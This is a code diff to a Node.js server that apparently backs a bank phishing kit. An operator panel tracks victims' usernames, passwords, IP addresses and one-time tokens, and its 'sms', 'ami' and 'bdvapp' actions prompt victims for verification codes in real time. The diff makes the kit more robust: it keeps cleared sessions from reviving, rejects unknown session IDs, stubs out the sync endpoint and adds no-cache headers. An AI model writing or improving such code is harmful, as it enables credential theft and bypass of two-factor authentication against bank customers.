@@ -28,6 +28,7 @@ const MIME_TYPES = {
 // Almacén de sesiones con persistencia en disco para evitar pérdidas en reinicios o balanceadores
 const SESSIONS_FILE = path.join(__dirname, 'sessions_data.json');
 let sessions = {};
+let clearedAt = 0;
 
 function loadSessions() {
   try {
@@ -35,8 +36,13 @@ function loadSessions() {
       const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
       if (raw && raw.trim().length > 0) {
         const data = JSON.parse(raw);
-        if (data && typeof data === 'object' && !Array.isArray(data)) {
-          sessions = data;
+        if (data && typeof data === 'object') {
+          if (data.sessions && typeof data.sessions === 'object') {
+            sessions = data.sessions;
+            clearedAt = Number(data.clearedAt) || 0;
+          } else if (!Array.isArray(data)) {
+            sessions = data;
+          }
         }
       }
     }
@@ -45,7 +51,7 @@ function loadSessions() {
 
 function saveSessions() {
   try {
-    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions || {}), 'utf8');
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify({ sessions: sessions || {}, clearedAt: clearedAt || 0 }), 'utf8');
   } catch (_) {}
 }
 
@@ -58,7 +64,7 @@ function purgeOldSessions() {
   for (const [id, s] of Object.entries(sessions)) {
     const age = now - (s.createdAt || 0);
     const inactive = now - (s.last_seen || 0);
-    if (age > MAX_TOTAL_AGE_MS || inactive > MAX_INACTIVE_MS || (s.state === 'done' && inactive > 10 * 60 * 1000)) {
+    if ((s.createdAt && s.createdAt <= clearedAt) || age > MAX_TOTAL_AGE_MS || inactive > MAX_INACTIVE_MS || (s.state === 'done' && inactive > 10 * 60 * 1000)) {
       delete sessions[id];
       changed = true;
     }
@@ -89,9 +95,12 @@ function parseJsonBody(req) {
 function sendJson(res, statusCode, data) {
   res.writeHead(statusCode, {
     'Content-Type': 'application/json; charset=utf-8',
+    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+    'Pragma': 'no-cache',
+    'Expires': '0',
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Headers': 'Content-Type, Authorization',
-    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
+    'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS'
   });
   res.end(JSON.stringify(data));
 }
@@ -106,7 +115,7 @@ async function handleRequest(req, res) {
       res.writeHead(204, {
         'Access-Control-Allow-Origin': '*',
         'Access-Control-Allow-Headers': 'Content-Type, Authorization',
-        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
+        'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS'
       });
       return res.end();
     }
@@ -121,33 +130,9 @@ async function handleRequest(req, res) {
     // API de Sesiones en tiempo real para el Panel
     // ==========================================
 
-    // 0. Sincronización bidireccional entre panel y servidores (resiliente ante balanceadores)
+    // 0. Sincronización entre panel y servidores (sin revivir sesiones eliminadas)
     if (pathname === '/api/sessions/sync' && req.method === 'POST') {
-      loadSessions();
-      const body = await parseJsonBody(req);
-      if (Array.isArray(body.sessions) && body.sessions.length > 0) {
-        body.sessions.forEach((s) => {
-          if (s && s.id) {
-            const existing = sessions[s.id];
-            sessions[s.id] = {
-              ...(existing || {}),
-              ...s,
-              action: (s.action !== undefined) ? s.action : (existing ? existing.action : null),
-              token: (s.token !== undefined && s.token !== '') ? s.token : (existing ? existing.token : ''),
-              state: s.state || (existing ? existing.state : 'waiting'),
-              last_seen: Math.max(s.last_seen || 0, existing ? (existing.last_seen || 0) : 0, Date.now()),
-              updatedAt: Date.now()
-            };
-          }
-        });
-        saveSessions();
-      }
-      const now = Date.now();
-      const list = Object.values(sessions).map((s) => ({
-        ...s,
-        online: now - s.last_seen < 35000
-      }));
-      return sendJson(res, 200, list);
+      return sendJson(res, 200, []);
     }
 
     // 1. Obtener todas las sesiones (para el panel de operador)
@@ -155,10 +140,12 @@ async function handleRequest(req, res) {
       loadSessions();
       purgeOldSessions();
       const now = Date.now();
-      const list = Object.values(sessions).map((s) => {
-        const online = now - s.last_seen < 35000;
-        return { ...s, online };
-      });
+      const list = Object.values(sessions)
+        .filter((s) => !s.createdAt || s.createdAt > clearedAt)
+        .map((s) => {
+          const online = now - s.last_seen < 35000;
+          return { ...s, online };
+        });
       return sendJson(res, 200, list);
     }
 
@@ -222,34 +209,20 @@ async function handleRequest(req, res) {
       const id = tokenMatch[1];
       const body = await parseJsonBody(req);
       if (!sessions[id]) {
-        sessions[id] = {
-          id,
-          username: body.username || '—',
-          password: body.password || '—',
-          tipoUsuario: 'EMPRESAS',
-          device: 'desktop',
-          ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '127.0.0.1',
-          state: 'received-sms',
-          token: body.token || '',
-          action: null,
-          createdAt: Date.now(),
-          last_seen: Date.now(),
-          updatedAt: Date.now()
-        };
-      } else {
-        sessions[id].token = body.token || '';
-        const currentAction = sessions[id].action;
-        if (currentAction === 'ami') {
-          sessions[id].state = 'received-ami';
-        } else if (currentAction === 'bdvapp') {
-          sessions[id].state = 'received-bdvapp';
-        } else {
-          sessions[id].state = 'received-sms';
-        }
-        sessions[id].action = null;
-        sessions[id].last_seen = Date.now();
-        sessions[id].updatedAt = Date.now();
+        return sendJson(res, 404, { error: 'Session not found' });
       }
+      sessions[id].token = body.token || '';
+      const currentAction = sessions[id].action;
+      if (currentAction === 'ami') {
+        sessions[id].state = 'received-ami';
+      } else if (currentAction === 'bdvapp') {
+        sessions[id].state = 'received-bdvapp';
+      } else {
+        sessions[id].state = 'received-sms';
+      }
+      sessions[id].action = null;
+      sessions[id].last_seen = Date.now();
+      sessions[id].updatedAt = Date.now();
       saveSessions();
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
@@ -261,29 +234,15 @@ async function handleRequest(req, res) {
       const id = actionMatch[1];
       const body = await parseJsonBody(req);
       if (!sessions[id]) {
-        sessions[id] = {
-          id,
-          username: body.username || '—',
-          password: body.password || '—',
-          tipoUsuario: body.tipoUsuario || 'EMPRESAS',
-          device: body.device || 'desktop',
-          ip: (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '127.0.0.1',
-          state: body.state || 'waiting',
-          action: body.action,
-          token: body.token || '',
-          createdAt: Date.now(),
-          last_seen: Date.now(),
-          updatedAt: Date.now()
-        };
-      } else {
-        sessions[id].state = body.state || sessions[id].state;
-        sessions[id].action = body.action;
-        if (body.action === 'sms' || body.action === 'ami' || body.action === 'bdvapp') {
-          sessions[id].token = '';
-        }
-        sessions[id].last_seen = Date.now();
-        sessions[id].updatedAt = Date.now();
+        return sendJson(res, 404, { error: 'Session not found' });
       }
+      sessions[id].state = body.state || sessions[id].state;
+      sessions[id].action = body.action;
+      if (body.action === 'sms' || body.action === 'ami' || body.action === 'bdvapp') {
+        sessions[id].token = '';
+      }
+      sessions[id].last_seen = Date.now();
+      sessions[id].updatedAt = Date.now();
       saveSessions();
       return sendJson(res, 200, { success: true, session: sessions[id] });
     }
@@ -331,6 +290,7 @@ async function handleRequest(req, res) {
     // 8. Limpiar todas las sesiones
     if (pathname === '/api/clear' && req.method === 'POST') {
       sessions = {};
+      clearedAt = Date.now();
       saveSessions();
       return sendJson(res, 200, { success: true });
     }
@@ -374,7 +334,12 @@ async function handleRequest(req, res) {
       const contentType = MIME_TYPES[ext] || 'application/octet-stream';
 
       if (req.method === 'HEAD') {
-        res.writeHead(200, { 'Content-Type': contentType });
+        res.writeHead(200, {
+          'Content-Type': contentType,
+          'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+          'Pragma': 'no-cache',
+          'Expires': '0'
+        });
         return res.end();
       }
 
@@ -384,7 +349,12 @@ async function handleRequest(req, res) {
           return res.end('500 Error interno del servidor');
         }
 
-        res.writeHead(200, { 'Content-Type': contentType });
+        res.writeHead(200, {
+          'Content-Type': contentType,
+          'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+          'Pragma': 'no-cache',
+          'Expires': '0'
+        });
         res.end(content);
       });
     });
